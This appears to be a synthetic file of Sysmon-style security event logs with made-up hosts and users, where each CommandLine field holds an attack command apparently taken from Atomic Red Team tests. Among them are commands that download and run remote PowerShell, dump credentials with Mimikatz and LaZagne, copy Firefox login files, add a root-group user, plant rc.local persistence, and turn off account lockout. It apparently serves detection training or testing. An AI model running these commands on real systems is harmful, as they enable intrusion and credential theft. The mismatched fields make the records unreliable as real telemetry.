    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "laptop-28.richardson.org",
        "User": "xmurphy",
        "ProcessID": 5743,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"sed -i '$ a #art_test_1562_006_1' /etc/audisp/#{audisp_config_file_name}\\nif [ -f \\\"/etc/#{auditd_config_file_name}\\\" ];\\nthen sed -i '$ a #art_test_1562_006_1' /etc/#{auditd_config_file_name}\\nelse sed -i '$ a #art_test_1562_006_1' /etc/audit/#{auditd_config_file_name}\\nfi \\nsed -i '$ a #art_test_1562_006_1' /etc/#{libaudit_config_file_name}\\n\",",
        "LogonID": 916237,
        "LogonGuid": "b56746bb-5da9-4e40-a7d2-9d30ef50ea8a",
        "SourceProcessID": 4028,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Windows\\while..exe",
        "DestinationProcessID": 4531,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Program Files\\local..exe",
        "UtcTime": "2024-05-17T01:36:51.770335Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "desktop-03.mcguire.com",
        "User": "millerrobert",
        "ProcessID": 5297,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"assoc #{extension_to_change}=#{target_extension_handler}\\n\",",
        "LogonID": 699994,
        "LogonGuid": "7c32b849-11e0-43cd-ac87-3da6b6f5e084",
        "SourceProcessID": 6963,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Users\\Public\\number..dll",
        "DestinationProcessID": 7651,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Users\\Public\\perform..exe",
        "UtcTime": "2024-05-17T01:36:51.770335Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "email-96.rodriguez-clark.org",
        "User": "longjohn",
        "ProcessID": 3641,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"screencapture #{output_file}\\n\",",
        "LogonID": 877768,
        "LogonGuid": "97466a83-cce0-48c2-9f09-a8347a3e54bf",
        "SourceProcessID": 2462,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Program Files\\population..exe",
        "DestinationProcessID": 7676,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Users\\Public\\glass..dll",
        "UtcTime": "2024-05-17T01:36:51.770335Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "lt-19.thomas-brown.com",
        "User": "jacqueline18",
        "ProcessID": 8125,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"useradd -g 0 -M -d /root -s /bin/bash #{username}\\nif [ $(cat /etc/os-release | grep -i 'Name=\\\"ubuntu\\\"') ]; then echo \\\"#{username}:#{password}\\\" | sudo chpasswd; else echo \\\"#{password}\\\" | passwd --stdin #{username}; fi;\\n\",",
        "LogonID": 623600,
        "LogonGuid": "ce182e8a-8e33-47bd-9fab-41bca4ea5445",
        "SourceProcessID": 1276,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Users\\Public\\maybe..exe",
        "DestinationProcessID": 6279,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Users\\Public\\open..exe",
        "UtcTime": "2024-05-17T01:36:51.770335Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "email-12.pineda-parrish.net",
        "User": "wrightmary",
        "ProcessID": 4440,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"Set-PowerCLIConfiguration -InvalidCertificateAction Ignore -ParticipateInCEIP:$false -Confirm:$false \\nConnect-VIServer -Server #{vm_host} -User #{vm_user} -Password #{vm_pass}\\nGet-AdvancedSetting -Entity #{vm_host} -Name 'Security.AccountLockFailures' | Set-AdvancedSetting -Value '0' -Confirm:$false\\nDisconnect-VIServer -Confirm:$false\\n\",",
        "LogonID": 293940,
        "LogonGuid": "4fd8f0e8-516e-4d3c-bfb4-b89ed2291596",
        "SourceProcessID": 5789,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Users\\Public\\woman..exe",
        "DestinationProcessID": 1296,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Program Files\\image..dll",
        "UtcTime": "2024-05-17T01:36:51.771438Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "laptop-56.dudley-ray.com",
        "User": "gary47",
        "ProcessID": 2667,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"if [ ! -d ~/Library/LaunchAgents ]; then mkdir ~/Library/LaunchAgents; fi;\\nsudo cp #{path_malicious_plist} ~/Library/LaunchAgents/#{plist_filename}\\nsudo launchctl load -w ~/Library/LaunchAgents/#{plist_filename}\\n\",",
        "LogonID": 121088,
        "LogonGuid": "943ab370-f12a-4bfd-871a-83dc0a2c3575",
        "SourceProcessID": 1963,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Windows\\question..dll",
        "DestinationProcessID": 1920,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Windows\\issue..exe",
        "UtcTime": "2024-05-17T01:36:51.771438Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "lt-62.pittman-ochoa.info",
        "User": "laurie96",
        "ProcessID": 3481,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"copy \\\"#{exe_path}\\\" %temp%\\\\T1036.003_masquerading.docx.exe /Y\\ncopy \\\"#{exe_path}\\\" %temp%\\\\T1036.003_masquerading.pdf.exe /Y\\ncopy \\\"#{exe_path}\\\" %temp%\\\\T1036.003_masquerading.ps1.exe /Y\\ncopy \\\"#{vbs_path}\\\" %temp%\\\\T1036.003_masquerading.xls.vbs /Y\\ncopy \\\"#{vbs_path}\\\" %temp%\\\\T1036.003_masquerading.xlsx.vbs /Y\\ncopy \\\"#{vbs_path}\\\" %temp%\\\\T1036.003_masquerading.png.vbs /Y\\ncopy \\\"#{ps1_path}\\\" %temp%\\\\T1036.003_masquerading.doc.ps1 /Y\\ncopy \\\"#{ps1_path}\\\" %temp%\\\\T1036.003_masquerading.pdf.ps1 /Y\\ncopy \\\"#{ps1_path}\\\" %temp%\\\\T1036.003_masquerading.rtf.ps1 /Y\\n%temp%\\\\T1036.003_masquerading.docx.exe\\n%temp%\\\\T1036.003_masquerading.pdf.exe\\n%temp%\\\\T1036.003_masquerading.ps1.exe\\n%temp%\\\\T1036.003_masquerading.xls.vbs\\n%temp%\\\\T1036.003_masquerading.xlsx.vbs\\n%temp%\\\\T1036.003_masquerading.png.vbs\\nC:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe -File %temp%\\\\T1036.003_masquerading.doc.ps1\\nC:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe -File %temp%\\\\T1036.003_masquerading.pdf.ps1\\nC:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe -File %temp%\\\\T1036.003_masquerading.rtf.ps1\\n\",",
        "LogonID": 223597,
        "LogonGuid": "ab7be9c9-72a2-4ecb-81ba-92962b2fa38c",
        "SourceProcessID": 2997,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Users\\Public\\painting..dll",
        "DestinationProcessID": 2591,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Users\\Public\\natural..dll",
        "UtcTime": "2024-05-17T01:36:51.771438Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "laptop-85.ray-davis.com",
        "User": "chadmiles",
        "ProcessID": 7604,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Sharpweb.ps1')\\nInvoke-Sharpweb -command \\\"all\\\"\",",
        "LogonID": 401010,
        "LogonGuid": "ad40549f-ac86-48ac-9c6b-d8918358189c",
        "SourceProcessID": 4510,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Program Files\\defense..dll",
        "DestinationProcessID": 8514,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Users\\Public\\have..exe",
        "UtcTime": "2024-05-17T01:36:51.771438Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "laptop-96.hanson.com",
        "User": "umurray",
        "ProcessID": 5100,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"find /usr/bin -perm -4000\\n\",",
        "LogonID": 409436,
        "LogonGuid": "0a0b5857-38cd-4696-9154-574365c0b68b",
        "SourceProcessID": 1605,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Windows\\world..dll",
        "DestinationProcessID": 7232,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Program Files\\long..dll",
        "UtcTime": "2024-05-17T01:36:51.771438Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "lt-27.mclaughlin-mullen.com",
        "User": "katherine89",
        "ProcessID": 5418,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"\\\"#{psexec_exe}\\\" #{remote_host} -accepteula -c #{command_path}\\n\",",
        "LogonID": 575699,
        "LogonGuid": "3b7b3fc4-dd94-44be-8a47-ae7a60ecc695",
        "SourceProcessID": 7714,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Windows\\candidate..exe",
        "DestinationProcessID": 3923,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Program Files\\ground..dll",
        "UtcTime": "2024-05-17T01:36:51.772438Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "laptop-50.baker-wilson.info",
        "User": "raymondlarson",
        "ProcessID": 7713,
        "ProcessName": "malware.exe",
        "CommandLine": "\"\\\"#{file_name}\\\"\\n\",",
        "LogonID": 105068,
        "LogonGuid": "940aa06b-70fa-4416-8930-52ba8895e5af",
        "SourceProcessID": 4513,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Windows\\hit..exe",
        "DestinationProcessID": 2756,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Windows\\improve..exe",
        "UtcTime": "2024-05-17T01:36:51.772438Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "laptop-21.flores.com",
        "User": "wilsoneddie",
        "ProcessID": 2255,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"echo 0> /var/spool/mail/#{username}\\n\",",
        "LogonID": 543418,
        "LogonGuid": "f2c2a99d-a3ea-4879-aed1-ba1ae679cb8a",
        "SourceProcessID": 1807,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Program Files\\article..dll",
        "DestinationProcessID": 9215,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Users\\Public\\security..dll",
        "UtcTime": "2024-05-17T01:36:51.772438Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "email-86.castro.com",
        "User": "russellkimberly",
        "ProcessID": 3040,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"net group /domain \\\"Domain controllers\\\"\\n\",",
        "LogonID": 819110,
        "LogonGuid": "db3100fc-920d-498f-8f01-92a714d756d8",
        "SourceProcessID": 2508,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Program Files\\wish..dll",
        "DestinationProcessID": 7952,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Users\\Public\\husband..exe",
        "UtcTime": "2024-05-17T01:36:51.772438Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "desktop-05.blake.com",
        "User": "ghunter",
        "ProcessID": 8055,
        "ProcessName": "malware.exe",
        "CommandLine": "\"cscript \\\"#{vbscript}\\\" > $env:TEMP\\\\T1059.005.out.txt\\n\",",
        "LogonID": 563333,
        "LogonGuid": "8928fa3e-88a5-4167-924f-77955430200f",
        "SourceProcessID": 5094,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Program Files\\ago..exe",
        "DestinationProcessID": 8691,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Windows\\citizen..exe",
        "UtcTime": "2024-05-17T01:36:51.772438Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "web-60.schmitt.com",
        "User": "christianbarton",
        "ProcessID": 6035,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"Add-Type -AssemblyName System.IdentityModel\\n$ComputerFQDN=$env:LogonServer.trimStart('\\\\') + \\\".\\\" + $env:UserDnsDomain\\nNew-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList \\\"HTTP/$ComputerFQDN\\\" \\n\",",
        "LogonID": 451836,
        "LogonGuid": "0b86cf28-73fc-471d-8cf6-3a030ec76838",
        "SourceProcessID": 9961,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Users\\Public\\green..exe",
        "DestinationProcessID": 8066,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Program Files\\without..dll",
        "UtcTime": "2024-05-17T01:36:51.773438Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "lt-00.parrish-jordan.com",
        "User": "bensondon",
        "ProcessID": 9949,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"gpresult /z\\n\",",
        "LogonID": 174018,
        "LogonGuid": "bef05748-cb0d-4465-b36c-72f6fc05ec77",
        "SourceProcessID": 9231,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Program Files\\parent..dll",
        "DestinationProcessID": 5001,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Program Files\\upon..exe",
        "UtcTime": "2024-05-17T01:36:51.773438Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "email-31.dominguez-hernandez.com",
        "User": "adamewing",
        "ProcessID": 3817,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"\\\"#{recon_commands}\\\"\\n\",",
        "LogonID": 964120,
        "LogonGuid": "0d41e407-0bbc-42d0-ba5c-bad18860ab88",
        "SourceProcessID": 3713,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Program Files\\city..exe",
        "DestinationProcessID": 1357,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Windows\\maybe..exe",
        "UtcTime": "2024-05-17T01:36:51.773438Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "lt-24.hawkins.org",
        "User": "brettsmith",
        "ProcessID": 9499,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\\nIEX (iwr \\\"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\\\" -UseBasicParsing)\\nInvoke-Maldoc -macroFile \\\"PathToAtomicsFolder\\\\T1070.001\\\\src\\\\T1070.001-macrocode.txt\\\" -officeProduct \\\"Word\\\" -sub \\\"ClearLogs\\\"\\n\",",
        "LogonID": 971497,
        "LogonGuid": "88717cc9-cdd5-4472-9119-1bd9c259c0d7",
        "SourceProcessID": 4971,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Program Files\\ten..exe",
        "DestinationProcessID": 9553,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Windows\\music..dll",
        "UtcTime": "2024-05-17T01:36:51.773438Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "db-20.moran.net",
        "User": "riveraconnie",
        "ProcessID": 3182,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"$Action = New-ScheduledTaskAction -Execute \\\"cmd.exe\\\"\\n$Trigger = New-ScheduledTaskTrigger -AtLogon\\n$User = New-ScheduledTaskPrincipal -GroupId \\\"BUILTIN\\\\Administrators\\\" -RunLevel Highest\\n$Set = New-ScheduledTaskSettingsSet\\n$object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set\\nRegister-ScheduledTask AtomicTaskModifed -InputObject $object\\n$NewAction = New-ScheduledTaskAction -Execute \\\"Notepad.exe\\\"\\nSet-ScheduledTask \\\"AtomicTaskModifed\\\" -Action $NewAction\\n\",",
        "LogonID": 242186,
        "LogonGuid": "21203d44-0735-45a1-8687-794ccc283cb4",
        "SourceProcessID": 8948,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Program Files\\black..exe",
        "DestinationProcessID": 3006,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Users\\Public\\radio..dll",
        "UtcTime": "2024-05-17T01:36:51.773438Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "lt-34.marsh.com",
        "User": "briannabyrd",
        "ProcessID": 8969,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"Remove-SmbShare -Name #{share_name}\\nRemove-FileShare -Name #{share_name}\\n\",",
        "LogonID": 288508,
        "LogonGuid": "4ac42430-bed7-463b-a379-5f929d6b445b",
        "SourceProcessID": 7294,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Users\\Public\\purpose..exe",
        "DestinationProcessID": 7468,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Program Files\\always..exe",
        "UtcTime": "2024-05-17T01:36:51.774437Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "srv-63.carter-dominguez.com",
        "User": "youngtravis",
        "ProcessID": 1666,
        "ProcessName": "malware.exe",
        "CommandLine": "\"ldifde.exe -f #{output_path}\\\\#{output_file} -p subtree\\n\",",
        "LogonID": 728976,
        "LogonGuid": "d9338ad8-4a67-4802-8197-bd246970f905",
        "SourceProcessID": 6667,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Program Files\\pass..dll",
        "DestinationProcessID": 8889,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Program Files\\interesting..exe",
        "UtcTime": "2024-05-17T01:36:51.774437Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "email-49.montgomery.com",
        "User": "rebecca32",
        "ProcessID": 7117,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"filename='/etc/rc.local';if [ ! -f $filename ];then sudo touch $filename;else sudo cp $filename /etc/rc.local.original;fi\\n[ \\\"$(uname)\\\" = 'FreeBSD' ] && alias python3=python3.9 && printf '#\\\\!/usr/local/bin/bash' | sudo tee /etc/rc.local || printf '#!/bin/bash' | sudo tee /etc/rc.local\\necho \\\"\\\\npython3 -c \\\\\\\"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgcmMubG9jYWwgPiAvdG1wL1QxMDM3LjAwNC5yYy5sb2NhbCcpCgo='))\\\\\\\"\\\" | sudo tee -a /etc/rc.local\\nprintf 'exit 0' | sudo tee -a /etc/rc.local\\nsudo chmod +x /etc/rc.local\\n\",",
        "LogonID": 849764,
        "LogonGuid": "4577978f-f20c-46e2-871d-8970978098ba",
        "SourceProcessID": 8027,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Program Files\\administration..exe",
        "DestinationProcessID": 5281,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Windows\\box..dll",
        "UtcTime": "2024-05-17T01:36:51.774437Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "desktop-98.frazier-murray.net",
        "User": "ywright",
        "ProcessID": 6247,
        "ProcessName": "nc.exe",
        "CommandLine": "\"set +o history\\n\",",
        "LogonID": 270168,
        "LogonGuid": "64df1863-afd0-460e-868d-0bc3eac551a2",
        "SourceProcessID": 5272,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Program Files\\company..dll",
        "DestinationProcessID": 9600,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Windows\\them..dll",
        "UtcTime": "2024-05-17T01:36:51.774437Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "srv-60.cook.biz",
        "User": "eugene32",
        "ProcessID": 5880,
        "ProcessName": "nc.exe",
        "CommandLine": "\"powershell.exe \\\"IEX (New-Object Net.WebClient).DownloadString('#{mimurl}'); Invoke-Mimikatz -DumpCreds\\\"\\n\",",
        "LogonID": 184278,
        "LogonGuid": "e21407ab-3669-4b30-bd58-bd1c4bb1a384",
        "SourceProcessID": 4711,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Users\\Public\\behind..dll",
        "DestinationProcessID": 6777,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Users\\Public\\personal..dll",
        "UtcTime": "2024-05-17T01:36:51.774437Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "laptop-84.howell.com",
        "User": "james38",
        "ProcessID": 8600,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"rpcping -s #{server_ip} -e #{custom_port} -a privacy -u NTLM 1>$Null\",",
        "LogonID": 761986,
        "LogonGuid": "c0a92cb0-467d-44b5-bf1a-8713128b96f1",
        "SourceProcessID": 9962,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Program Files\\improve..dll",
        "DestinationProcessID": 2040,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Program Files\\son..exe",
        "UtcTime": "2024-05-17T01:36:51.774437Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "desktop-15.mckinney.org",
        "User": "robertwilliams",
        "ProcessID": 9021,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"osascript #{scriptfile}\\n\",",
        "LogonID": 434881,
        "LogonGuid": "d3bfe0e1-1ac7-4750-9043-cb98273cbd91",
        "SourceProcessID": 7684,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Program Files\\stage..exe",
        "DestinationProcessID": 6632,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Program Files\\word..dll",
        "UtcTime": "2024-05-17T01:36:51.775437Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "laptop-96.robinson.info",
        "User": "lewisdouglas",
        "ProcessID": 4540,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"SCHTASKS /Create /S #{target} /RU #{user_name} /RP #{password} /TN \\\"Atomic task\\\" /TR \\\"#{task_command}\\\" /SC daily /ST #{time}\\n\",",
        "LogonID": 967658,
        "LogonGuid": "4b155dba-5436-408c-9a04-598e90924926",
        "SourceProcessID": 3464,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Program Files\\ball..exe",
        "DestinationProcessID": 1609,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Users\\Public\\stock..exe",
        "UtcTime": "2024-05-17T01:36:51.775437Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "email-05.clark.com",
        "User": "jenkinseric",
        "ProcessID": 1910,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"reg add \\\"HKEY_LOCAL_MACHINE\\\\Software\\\\Policies\\\\Microsoft\\\\Windows NT\\\\Terminal Services\\\" /v \\\"DisableRemoteDesktopAntiAlias\\\" /t REG_DWORD /d 1 /f\\n\",",
        "LogonID": 346930,
        "LogonGuid": "6dc14f65-c7f0-48a2-b9d8-6f83f4103c4d",
        "SourceProcessID": 1504,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Program Files\\large..exe",
        "DestinationProcessID": 3101,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Program Files\\continue..exe",
        "UtcTime": "2024-05-17T01:36:51.775437Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "lt-18.ferguson-soto.com",
        "User": "woodardshane",
        "ProcessID": 4171,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\\n. \\\"#{test_harness}\\\"\\n\\n$InstallerAssemblyDir = \\\"#{assembly_dir}\\\"\\n$InstallerAssemblyFileName = \\\"#{assembly_filename}\\\"\\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\\n\\n$CommandLine = \\\"/logfile= /logtoconsole=false `\\\"$InstallerAssemblyFullPath`\\\"\\\"\\n$ExpectedOutput = 'Constructor_'\\n\\n$TestArgs = @{\\n    OutputAssemblyDirectory = $InstallerAssemblyDir\\n    OutputAssemblyFileName = $InstallerAssemblyFileName\\n    InvocationMethod = '#{invocation_method}'\\n    CommandLine = $CommandLine\\n}\\n\\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly\\n\\nif ($ActualOutput -ne $ExpectedOutput) {\\n    throw @\\\"\\nInstallUtil class constructor execution test failure. Installer assembly execution output did not match the expected output.\\nExpected: $ExpectedOutput\\nActual: $ActualOutput\\n\\\"@\\n}\\n\",",
        "LogonID": 265271,
        "LogonGuid": "4bb0c396-7b58-4fc7-8df6-fdc98f0b80ed",
        "SourceProcessID": 1233,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Program Files\\movement..exe",
        "DestinationProcessID": 6528,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Windows\\candidate..exe",
        "UtcTime": "2024-05-17T01:36:51.775437Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "lt-63.gardner.com",
        "User": "christopherpatel",
        "ProcessID": 2384,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"$profile = (Gci -filter \\\"*default-release*\\\" -path $env:Appdata\\\\Mozilla\\\\Firefox\\\\Profiles\\\\).FullName\\nCopy-Item $profile\\\\key4.db -Destination \\\"PathToAtomicsFolder\\\\..\\\\ExternalPayloads\\\" > $null\\nCopy-Item $profile\\\\logins.json -Destination \\\"PathToAtomicsFolder\\\\..\\\\ExternalPayloads\\\" > $null\\nRemove-Item $profile\\\\key4.db > $null\\nRemove-Item $profile\\\\logins.json > $null\\nCopy-Item \\\"$env:PathToAtomicsFolder\\\\T1555.003\\\\src\\\\key4.db\\\" -Destination $profile\\\\ > $null\\nCopy-Item \\\"$env:PathToAtomicsFolder\\\\T1555.003\\\\src\\\\logins.json\\\" -Destination $profile\\\\ > $null\\ncd \\\"$env:PathToAtomicsFolder\\\\T1555.003\\\\bin\\\"\\n\\\"\\\"|.\\\\BrowserCollector.exe\\n\",",
        "LogonID": 756737,
        "LogonGuid": "ef446082-b991-4bfe-abf9-b26058abf93d",
        "SourceProcessID": 6798,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Program Files\\of..exe",
        "DestinationProcessID": 5236,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Windows\\third..dll",
        "UtcTime": "2024-05-17T01:36:51.776439Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "lt-78.winters.org",
        "User": "ramirezchristopher",
        "ProcessID": 8872,
        "ProcessName": "nc.exe",
        "CommandLine": "\"python2 laZagne.py all\\n\",",
        "LogonID": 780226,
        "LogonGuid": "0050b019-f012-4b9c-b825-23601c9bb868",
        "SourceProcessID": 3173,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Program Files\\heart..exe",
        "DestinationProcessID": 2962,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Windows\\example..exe",
        "UtcTime": "2024-05-17T01:36:51.776439Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "db-81.morgan.com",
        "User": "amandajohnson",
        "ProcessID": 5259,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"filename='/etc/rc.common';if [ ! -f $filename ];then sudo touch $filename;else sudo cp $filename /etc/rc.common.original;fi\\nprintf '%s\\\\n' '#!/bin/bash' | sudo tee /etc/rc.common\\necho \\\"python3 -c \\\\\\\"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgcmMuY29tbW9uID4gL3RtcC9UMTAzNy4wMDQucmMuY29tbW9uJykK'))\\\\\\\"\\\" | sudo tee -a /etc/rc.common\\nprintf '%s\\\\n' 'exit 0' | sudo tee -a /etc/rc.common\\nsudo chmod +x /etc/rc.common\\n\",",
        "LogonID": 481844,
        "LogonGuid": "6bd78d55-6e52-4160-bc7c-c6eead554042",
        "SourceProcessID": 2936,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Program Files\\structure..dll",
        "DestinationProcessID": 6192,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Program Files\\actually..exe",
        "UtcTime": "2024-05-17T01:36:51.776439Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "srv-85.johnson-mcdonald.com",
        "User": "stephenroach",
        "ProcessID": 5634,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"reg query HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Nls\\\\Language\\n\",",
        "LogonID": 335415,
        "LogonGuid": "d3d9a6f5-fbbc-4906-9389-564f47d530bb",
        "SourceProcessID": 7255,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Windows\\expert..exe",
        "DestinationProcessID": 1742,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Windows\\sell..dll",
        "UtcTime": "2024-05-17T01:36:51.776439Z"
    },
    {
